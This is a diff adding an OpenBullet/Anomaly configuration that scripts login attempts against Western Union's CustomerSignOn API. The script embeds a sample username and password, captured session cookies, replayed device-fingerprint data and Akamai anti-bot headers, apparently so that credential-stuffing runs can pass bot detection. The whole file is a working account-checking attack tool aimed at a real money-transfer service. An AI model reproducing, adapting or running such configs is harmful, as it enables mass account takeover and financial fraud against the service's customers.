@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "western Union 2",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-07T15:52:40.1630321+03:30",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.westernunion.com/wuconnect/rest/api/v2.0/CustomerSignOn?timestamp=1604749766309" 
+  CONTENT "{\"gateway_customer\":{\"identities\":{\"identity\":[{\"data\":\"Hessam123@gmail.com\",\"type\":\"USERNAME\"},{\"data\":\"123qwe123!@#\",\"type\":\"PASSWORD\"}]}},\"analytics\":{\"state\":null,\"analytic_event\":{\"fields\":{\"field\":[{\"name\":\"forgotPasswordFlag\",\"value\":\"N\"},{\"name\":\"loginErrorCount\",\"value\":\"0\"},{\"name\":\"siteInfoLoginUser\",\"value\":\"Hessam123@gmail.com\"},{\"name\":\"queryString\",\"value\":\"\"},{\"name\":\"wuRevision\",\"value\":\"Optimus\"},{\"name\":\"codebase\",\"value\":\"\"},{\"name\":\"lightboxFlag\",\"value\":\"N\"},{\"name\":\"siteCatalystVersion\",\"value\":\"\"},{\"name\":\"forgotUsernameFlag\",\"value\":\"N\"}]}}},\"device\":{\"id\":\"\",\"type\":\"WEB\"},\"external_reference_no\":\"1\",\"channel\":{\"name\":\"Western Union\",\"type\":\"WEB\",\"version\":\"9Z00\",\"device_identifier\":\"RESPONSIVE_WEB\"},\"security\":{\"session\":{\"id\":\"web-95472fb2-e857-4ed9-a630-0866628d3d99\"},\"client_ip\":\"172098086201\",\"black_box_data\":{\"data\":\"0400tyDoXSFjKeoNf94lis1ztinPla9Bqhc9Xyx2B+S3GHv4zk88XIRRrd6QtETF0MjCBPuJb6jXo7Stoj/J9RwnJx5YVcadG796wTpqC7aOF/G7cVE+xxeTH4Zc+cJURcFiYtBUbpa7l0EBgkGiZF1OxsQujxApGZPr0MdZ3wBjRru8LrekCKHpmZPtkage6S5ZtDJvlpWfR91kWl861fw5QemH9P6UyVFMTslfASkyAckMnSoJziAyl6uB5xKjTqLNXOp4yYEIf+K5HweK2VMICUxFXRiZcQcAnPGnG3CqgLln+4KLswTyWhDAstLN4US5V97h50/5jKsxJw1Y+ubeCQoQdMSta8rdJGUX1Cvd3aWg5dRbGWPI8GGv4RQQVRK6lU99UoH2xkkBdhvx9KqhqMGodvSL1s9lb4Z3904JgsIGPX0dG08euKOC9bULTq9BfUMhH1xWyGxfq3bGwE2owMjHkbqfNn2NeUWcFPczw6R2ksFamlnVDcPhNaG/vxUQtFDzFymJ/ueW/+e5dBdAazVU5W7cDTGK8+g/mDVDCxEgW/sGfGhs+k0zy5LkTIip80D46v2etIy5mZwvTfjFe7rv8kF7JAwwbiOloPbWit78mYfaXhIliA1/InDlj2XMuF6OiUfqPLjYdgXmjJkclzOmh8eKwlq1GvMUmHD0I3CCphFWtH9fLDhDYGOJFVPcAfOPjzqyODJKA+IhyeWtUEuHuH9BhO0tSyl6vqVyefergecSo06izVzqeMmBCH/iuR8HitlTCAlMRV0YmXEHAJzxpxtwqoC5Z/uCi7ME8loQwLLSzeFEuVfe4edP+YyrMScNWPrm3gkKEHTErWvK3SRlF9Qr3d2loOXUWxljyPAVpcqq3kfmP7OgSQ0Fzflca1WxiZ1a0z3VhghPLNHC/w9dek5r8WH9DtPq/jlyS0urRICnXBfM+ncZzhIqXLWnEMCy0s3hRLn08Th9FlNHDMJBqLj+Tz8r0O/E9ABp/9e7Ass1MT2qnJgdtJgFNiHnJSUYhwOoTvMyvWQSj841GLOtaXb68FHK3g4Z5ay8H1dfCN6tDzXbhYsAP/lFDn9jMoZBn3JV/D4Npo41ZFsxuifOq1vG2COftC6EEsoJWe4xxq0IURUjoXA+k9XRlIy/fAiytDYF80APDK7vwCgH1VjR3dWb5cO9rBpQQXh3Lqgyd0aUDwIcAhLBMc/+MoJb4yvRhXnDkIvUUFEobSeI0qy9cADXcUos4FhxDvfH6vCO/83aXcHWT9jUUKOEfQuFRlmaSkQHK6w=\",\"length\":1296},\"device_details\":\"{\\\"V\\\":\\\"2.0\\\",\\\"T\\\":\\\"webbr\\\",\\\"FP\\\":\\\"0cc847d5e872154c17899839764e1055\\\",\\\"user_agent\\\":\\\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36\\\",\\\"language\\\":\\\"en-US\\\",\\\"color_depth\\\":24,\\\"resolution\\\":[1366,768],\\\"available_resolution\\\":[1366,738],\\\"timezone_offset\\\":-210,\\\"session_storage\\\":1,\\\"local_storage\\\":1,\\\"indexed_db\\\":1,\\\"open_database\\\":1,\\\"cpu_class\\\":\\\"unknown\\\",\\\"navigator_platform\\\":\\\"Win32\\\",\\\"do_not_track\\\":\\\"unknown\\\",\\\"regular_plugins\\\":\\\"d790a30ff81ef07e6b46d35fa27d94aa\\\",\\\"canvas\\\":\\\"7c2f1341aed4262ee33a764d93e485a7\\\",\\\"webgl\\\":\\\"2016d9caa3a77ff71c022fc7b1155b47\\\",\\\"adblock\\\":false,\\\"has_lied_languages\\\":false,\\\"has_lied_resolution\\\":false,\\\"has_lied_os\\\":false,\\\"has_lied_browser\\\":false,\\\"touch_support\\\":[0,false,false],\\\"js_fonts\\\":\\\"278e33cdcb9cde585df76b6a13b2ff39\\\"}\",\"httpHeader\":\"access-control-allow-credentials: false\\r\\naccess-control-allow-headers: *\\r\\naccess-control-allow-methods: get,post\\r\\naccess-control-allow-origin: *\\r\\naccess-control-max-age: 86400\\r\\ncache-control: max-age=0, no-cache, no-store\\r\\nconnection: keep-alive\\r\\ncontent-encoding: gzip\\r\\ncontent-length: 21746\\r\\ncontent-type: text/html; charset=utf-8\\r\\ndate: sat, 07 nov 2020 11:48:52 gmt\\r\\nexpires: sat, 07 nov 2020 11:48:52 gmt\\r\\npragma: no-cache\\r\\nserver: apache\\r\\nstrict-transport-security: max-age=31536000; includesubdomains;\\r\\nvary: accept-encoding\\r\\nx-akam-sw-version: 0.5.0\\r\\nx-content-type-options: nosniff\\r\\nx-edgeconnect-midmile-rtt: 46\\r\\nx-edgeconnect-origin-mex-latency: 546\\r\\nx-frame-options: sameorigin\\r\\nx-xss-protection: 1; mode=block\\r\\n\"},\"bashPath\":\"/gb/en\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "BIGipServerwudispatcher.westernunion.com: 838938378.36895.0000; resolution_height: 800; resolution_width: 1280; is_tablet: false; is_mobile: false; AKCountry: US; AKZip: 98101-98109+98111-98112+98114-98119+98121-98122+98124-98126+98129+98131-98134+98136+98138+98144-98146+98148+98154-98155+98158+98160-98161+98164+98166+98168+98170+98174+98177-98178+98181+98185+98188-98191+98195+98198-98199; AKRegioncode: WA; AKCity: SEATTLE; AKAreacode: 206; AKCounty: KING; WUCountryCookie_: GB; WULanguageCookie_: en; AK_TLS_Version: tls1.2; bm_sz: BE139C32551A495594187EE4259721A6~YAAQpLMbuKYX4J11AQAArIaJognJj3h2zhQadCCAdcRk/zkEC82aPGFbPYmCOYM8crY8xgHmTxfeMsO5lwfQjEaeDe7HBeLjdNsVyqWg3aPUYGX/Sr9LeShCD2JOvCY5VcgOq9z1dKa8vG9siY3RcazeoCJKydRudzEBjKu4m7KsqR2uJgHTp9B7PQFrW2GjzF5YdCnl; wu_device_id: ab5d3117-ea7c-dd28-dc60-c17fd32eb187; _evga_cf93: 1753a8958d9a3cd5.; A4kgk7nd_dc: %7B%22c%22%3A%20%22S1A4MDJGbUxZcmNaVWlRUQ%3D%3DL5n8Xmw3YYpezpbJtO48W4KGCoC5TKBl5NFFW4PGQgH5OKnFxJQ5ml1uMfhOZwFD8Yzp8fcUrV02s_j4tapNJPpFwHf1dQ%3D%3D%22%2C%20%22dc%22%3A%200%2C%20%22mf%22%3A%200%7D; RT: \"z: 1&dm: westernunion.com&si: hzfh1np3jch&ss: kh7mjvte&sl: 0&tt: 0\"; userIdentity: newCustomer; cookieOptIn: CKTXNL+CKPERF+CKMKTG; A4kgk7nd: AAeOiaJ1AQAAJL_LYTapAveeK_2XdktOk-aEVsae93oj-jGLj5G4-7MdMG6E|1|1|8a20d7d9193686f19f515b3842dd58093697b87a; SessionId: web-95472fb2-e857-4ed9-a630-0866628d3d99; SessionDomain: www.westernunion.com; SessionInfo: 1604749731629; EncryptedSessionId: ut/HsZv7GV/iIaf8AgXggKPsxY+DKDqmb8SXckTebpFCdJH5jjQElQd0o1ydkKIZWNX+qv3ra0c57Hf0SYUA6g==; ClientIp: 172098086201; sessionCountry: gb; RT: \"z: 1&dm: www.westernunion.com&si: 42665be8-8b73-46b5-a7cf-9a13a9ec59cc&ss: kh7mjrsh&sl: 1&tt: au0&bcn: %2F%2F36f1f23d.akstat.io%2F\"; userCookieOptIn: ,C0001,C0003,C0002,C0004,; amplitude_id_4aec879ef8bf1823486c4338537ec441westernunion.comeyJkZXZpY2VJZCI6ImViOGI2ZjhlLTQyNTUtNDVmYi04ZWViLWZmNTFlNmJjMjVmZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwNDc0OTczNzg3NiwibGFzdEV2ZW50VGltZSI6MTYwNDc0OTczNzg3NiwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; QuantumMetricUserID: 2b627d73c9070b39172499884c227956; QuantumMetricSessionID: 6f92da305c58b5d7c70453f01fa311d5; _ga: GA1.2.1456184122.1604749739; _gid: GA1.2.1747265128.1604749739; _abck: 23C3EF46867BF30F84285307B08D977C~0~YAAQpLMbuD4e4J11AQAALCeKogRpxpOBjd1UtF/73dEM8lnCqyy+0H58uPUHwlxDxe0ofxrB6djY8YNZPcy8y7k4jUvxjI6uIiR8+yvIyC18wJdwtFCV8v/jCQ4WgiPzdAULR4Q5uU9ohHpkDLlaSXKFwJ1Sr9aVXeXQB6kvnjDc5DJMEa2j3aSuB9dwR0C77WoEKTLt2u1iribYllzqRayNbkX+W45ZAPMcT5b3nij/6124iHMXAMq1HoHRPBMbBm5f2Do0VW/j0GIP1I60v08zTZSSli8ZqrfGVccN992T4tQ9LdxjPb+DIB5YQLWKDBiN8JaaXY47UU0RWB91ZoBeeUptJNNM3WUxKw==~-1~-1~-1" 
+  HEADER "POST https: //www.westernunion.com/wuconnect/rest/api/v2.0/CustomerSignOn?timestamp=1604749752988 HTTP/1.1" 
+  HEADER "Host: www.westernunion.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 3861" 
+  HEADER "X-NYUPe9Cs-z: q" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" 
+  HEADER "X-NYUPe9Cs-a: va=j73ybg6fjPv=pdL0DO6NTma_H03FJygYIMp1UT8tUz2tZeVkH_EeLbffqpfbrLBmLK3B1IB1_ZIgf-Ip_iU_Gr3DfZzo8reaCnpoD55fkeA=IwvRcf_W0rnZwRl8RDiM657b5ZzTerUTJw954Xoa_YT8JfMoBV3FclZ7OEBXZyi1HCxgphEibOzK3j7dad8FkcclXEXVIH-5K2YzdC3HtMA3NYmp-ALPcZp=jbgSCP-ryG1K9suijg4uf0_0leqpeTFFd8T7dSaJCIjq_iSV0p2xVfKz3OlOfvrkw47frhzJoL2fNdoxHGUkP85hVy0MDieOGGyHVaRzqAeBPGlNo=Nw7hEY-cMR-eMLjUkNylrim56eAU8MrP=DVbYyJpl_fSqbDghvPCv96LMDkATB4b1T0AbW9omRHVzom6LR0Ue1lCP5BfxawyIr=3CW-NcDmXl5iRKqD9ZxfW=2acXIsps5Ws2rfEslPu3CJG1GCRfvSrD3b5PE1_jM3r8J1m2WgllI=ZZntm6lVMxxwDb9DrYPG-_aAR4eZUWKgk8kJEl3xr7=XuOVSp609LLdW1pAa_lWfm8B3A0i0pDhYHUo2HKJL7OzCTv6wC1=ynNscOyUnU9Lf0=jhWcyVX4ysMXx_ZwjqfsE8A_At9mFF_B167cRSBFANPcoT0VBMZ7mlUnb8VmrM6tAM=Hf_YPAlN2Pn8slJFbs2LfnNK6u9MXjBOLyCW6xc9TZPIWukqMztzdorLUe5NWt-ggz-0-PbLzLcN176gCDnuoTBgrKtDsS-r6=yzTzCuiEbTvrk5Or=4x5CjaeGkpC-T7tOya9XfP9jirisjl_Vd1TJwszgkKRFIle8WCq_=4C9839VRwJ-VusXh1wT=OpmcFr6XzKn68jvmKFCje-sZ1ZZlTDDBOGwR5bEtyoOY6AoBGcyBra-s9kfWfvjtlztE6iZGw=SJHVdMPx5=ZDpnIEAbC4cMAmeG5yXJWrSAo9OW8yqKs-1=sjqAs5PjV03xS20FsNVTEq0xurayDnh=W5o7hPBVoazMCbZNloRyVLZitjKTX-9GHnYMrpouzhNLYqnLqJzkD4jKvEO=0xOH_7dVKab1gWsR7=CZdoLYcgcUi9WbFbAAfea4iw4SpO8T5-p--YyZ7lw4ILM_0KvNyZhzIj-9-U41CasGfI9vLpO2dLzrpUrhP0gFPwqb1vlvf4utay0dKNCLNJoTdqKPIZkLHml2vEeGDAoym-ti-qnlHftTqJPki9zZE=dk3MSlLAFqM1d6x3M91Pc8EedtuHmxt1yecxDrSXw-FiWc_sBjcb9btjqv3w3hV84N8O3KCOi5Y_N6bTkqeiVMvMOpUEMfq46etOH3jjMlw67CXgWu5GW=MlJ_6xl8hmwk=fAnio-7_87EeoYVr4455rJ_WFBBT_8v2pd9D5RnLpm=ZYgofknSSJaNnAD0IU8DuCfm8Um4j_qrS6F9Obs--rGSyZT14BJXViqwWmMIbCeP-9mYOn75=AarPq5IjCpnqEmDTL6swaf56R5dF1rYZmlxcWR1dscV=Wa03_02ak11OlxvzaXFBXGKrqjAUd6jikXICsEXse_3=XYEYirCF0vh248uStVtagapyN-9-rbc5zAt6u2jH336mk-ft3buIxZKFX8rXazYXFX2THdFbwzoxK6zOblZP3KfpDS_1n6M9Y7h6Y0V-mAifHYvPFcvaBwN4bpaZDbupJ5ByiafNn-ml4-cNF4lg3Nb4Xn_Gfh7lvOfjFF6YEjJSBZxqU_=H9x3qk2tCU34CYYgIpMfjEwOWSRAe04HFrkcVuEU-7qlo1ZiFFcxO13pW2HX4=TcKUHuzFWmI0-UfR=H9mCNVdfS9MBrFFuvSSXILbZCPxVR5Goz=oLMKEBr2mEaxk4VhVgWbs2aiW5=ie-6KGbcEza3gsEz1g-dMp2cif9sAN3_pRRljF1aOl023gMPVLfWWhxX9raoPENnN72JXYS5yZX0k3NawxP1uB3eKIjtxTtRk7hVpZXlrV9NLnTSur2MPJFwSHuYOwmu_ID-Lyj5Pa3nDw4ze75PGLNGEo_ne7N2Bpix7EtwxGZJ1zFfyD7BjpIo-IrSiPHS1bCC=-noviHUahw87yln7AiTWFU=JB3EkPNZFxh-hplKACSW0yW7xx6cuXSlRdTwBP_HScozJOzHlc9z_mejSI_yCBPDU3zjjTHcesmklPjSKtwLJgxJsSr1hpHrzxdBqd6l6KVOtSjaqy6exyjVMyDoFZzws3Vy9k3ctWM_TAcCvy3hYfz=q2FW-7lBdARRZ=r569-h5Eu32Xe9fa5NcPx2gjhhZwvMg95TmwaqAVDXMdgq0UAAG=Pb95o73teA0MfRm4oCoPCz9Rk7ROUvtCMMp6fl6op8k=GKOcrq0G=KpxstAdjP-kowicLBVTPtOv0w9rKyy_AWbDnsrDLgJy7qSqmyTzIzgpHxJl=8ef5EYPg=Jy91LAqj6cIgA1-XVUkW6l9EV_ydVwZymCGdGZ0C5sgAPWPAMvMP_c_J1wL04aXbuvUYhPOv=e6i9icI16Y1kifHH15j06bZZb28cBzsSRkWphGOSLBJeh3Hdi4eWyxo6zc1iIGcX3NBu6AYd9wHOgxsAOcJ4AroZkF-Ka1c=7z2J2cqslu-gU40y3sdr=cCiiNXLM_BEoCqaz246H4U=7tIq_Rjf4A1ftTF7mP_yN0Orw-IF87STHWdbV9Wc0u3BwH0Shhlb=fukh3eNh1RaALEikLHjg=zWdEyOqXkR861h2tNubhPuzYr0U2OpD4G96-dOomgf7J1CUAoYAxnHsiifs6KRJRWx6_fD0MyJH4N86vDcqy8DB5yHSOr238mOg12xfhSTnwhWIYNRHwoCAok831zBIrnxpWTOKN2MbhEAlN2XnWF=oV41cem45JyDkuFLuY8eCaR6ik_1a2G9YOi9u3NSDxeKgwTW4CiTIzJIaOG-e4FZ8PG1W4MmzmUAPokXkGuRWo_=N-O93v=u_8OdnLXaTGF_6n5JcdIVw4xGgHAuEYalxk1Mx3N3WNsbTVNGanV7eKkA_94tCUb9KNbk7A78ntXoNLJ68swFi5rvgXCocvIlBndk0g1Ye14NtrCl=e0gVdF33C193n-47J2mL=PNvG=t-9ZLbx=2TPhqVH-_NxqEMIFjz2RYuqnEf-yYWuDap_2f3llNyWPPAgR_Y-v0WKwdLBo08wVm0x=463=_U2HaHgHo6lcfHxc7LENc5m=M7jdf8JS6HdoNkrdJIn0nL8gdBSzxAP-s45RjDr=7Bs_5FYOwSePi9p0KsZ1e=gOSZnhpdX11U8qLfA48-CiSpJvhrz81HKTWlvhHke__Xzrzkpb=h6XlYBNnul18ikGBs8kGIMW77NkqeCN_D048d8YyCSzUqWr-IOxPhilYN3VOgaWRR8feU90veVT9M26O6iRNvH-DaG_jDGqfPanT0E=1VDH6PMOZN4Kh59OEjWjNHBna5Tkm0qjA_yEc=TFTJ2vr0UyzP0-JKvzGpT5JBYC0BDjWdJPusvGGoxvKnUROM5W5aYbOp4TbpDuJIXj_ITnxvyqcTomnzsm_DCbG3aY8n2pIV=VnjqVJzIcxygVqFjAD8YeH40=4UCXIFtmalTFkaygPw99qkvAWsktTGR2dCzvbOlDJLsmJnyeo-joPo1OGnhabp-iwTtgHEy8M7EzbsfkNeHaGbB10E6BgTu4ebAtf27bM3xbE8TtgoLVEBxO3rj80dl0DErcuB5tWRpbGFvM60glo8NSNetYnY=SExTnkmLwhjJ2bBWL6qxOtbySU7Gg8xAE2MusDPevZOkIHtiE5Xm7ePZYjj8_bUznF1cSWGupEpEx28UEN3__x1A2-e06RyPbktPt9vTroEyHnvnqvG7re4dIyO3i2R_4oAJ891nrl_C9Ox-_wa4TqrWLWafVTCW4SrlwUAE=ERltG-p2b7bZkee12RbdcNSedpBRzXC=U27KUb7peJ7FOwqd38EaASTwEvJNp=qWVFN8wqcF2EMtnwXo441j-1K_q1Oi=pTjgjEk=FR4rzPoRSlfk6e=stiajDWa4jK52kS00Mm=3E_GkR=pKATt8zCnXd0Y4s_DGoj8lJlxdn4z_3zoPSH-9rDKkm=mkGjvz4Y2lgRI2FqbL6-83sc9IL=mpaY2yFUFmqrRB0jTU_NB==hV-hhE4LkUlMKpLVCnVF=nM5kt=c_Yd-iig-hwpUMR1AqeqW97UwOANkJTo1v64nErHLpw-m-JAVptFOijK2xiq5z1Iae_fFIZzR=SvllUdtZbUOtyc7oCpOsFv0Km5yuqXCyaMEBcaKlaJY_cYTpT4EGVtALkFtm7COP9REIoZB7HXz2pMdq5hHqV0D9cYsgxAPNe5_lcWBkjBlAFa8R7Km7PXbTtvw0bfRq9aysU-HJ3hbOFLG49XGZIOMXC8Vl6of2nrnGDu1BZKZAF2X0yHY3LuP0CBvxEZnNUKl7gcyEXeiZ04gJEZWNkSojPfkMWiuyg89O006bsRzRi-tkBOoWnFvgq5yu0bJX9pd_wNbJpZVK4y6kk1ejR9C0ye8n8L6NMh3x20CgCFrmS1wuveEJUjDPBZJX7ge=jV6SU5g26tidfgXPLPco3hrIb1yWbJNHGJHmn5boDhaGilERJGJucaYY3phCkNzcsbsjlsu7lXzXfa2LilxiycIl26GptEY6Td2fh8k4eJ_WLBRZNPaJgU00h4XI7i8vIscIHdOUmVPyxrqramspBuejhC63F2aakbwvrEdmiMMsa5yvKas-Ik4tD9ust33M33cDAOc483ctJD0aXVox800TZ855VsmunAVyHGMUS3vs5esE9CVW-pfuCI2A0wJVP7lJmZl-79L_aH-XtDgBMf5dpZPcF91jHB32i7XbFYnXpahocTRHAt3uHULobv4NsrwoCCqEzy82R-Kmyjo1hJqqKnN8ZE-U1opC40tTjWyNsHuem2uKnM7Vk6TZOOFjlJ-=8GYquUaONLv3RLveAgS_0PutR02EGa2Xquf_Nu7v-yxgWaCbs=GFFuZYm6SE_2-5rqmlfPc5AdPiWR3vimz3o=3JZonSDMOE9UbPo7tDepF8ZjVAGNe5AlT0M5HScTiMNeWceswWPRW6WZB6xj64h_IvSlw30AnNwO3oMN6Cc3dJ-=TMbFS8l2_LJg5hYktx-JR2wIMFuoWzU-563Z5YJb3VAhLMmlk5ejBHB7sPUsUMCk0cCdhrSoo5DYBbaURaMwU3_-BrgvL-HF41VwUfpuL-w63qDBHhASRFWa71VqbhC8_bhMM_mUiSaUVNqyqAv4xf-9wGUUc-Rn7w3kL9GOZjgmVZ_mwlGjgF-NcqkImXzLp4lcLu4E6O8GmulVCb77y8YhKWDCbjjZGNCS5x2MCe_V55p8NwGS" 
+  HEADER "X-NYUPe9Cs-c: AGAehqJ1AQAA6tOuPbAfqFbAmpqqkB3vQ_dRXvMvXMOkeHuUM10NRyGwdHnt" 
+  HEADER "X-NYUPe9Cs-d: AAaixIihDKGOocGASZAQjICihCJdDUchsHR57cdcEgX6wthaAOtn4npiZEpVYdiEUNbDbks" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-NYUPe9Cs-f: A_6SiaJ1AQAAbagIU6NugxCUcoiGI-gwDu0Ac4Di_hH-y9vYrrnLBzCGiz9dAaxiVsmucgA7wH8AAEB3AAAAAA==" 
+  HEADER "X-NYUPe9Cs-b: -s7wd8n" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://www.westernunion.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.westernunion.com/gb/en/web/user/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
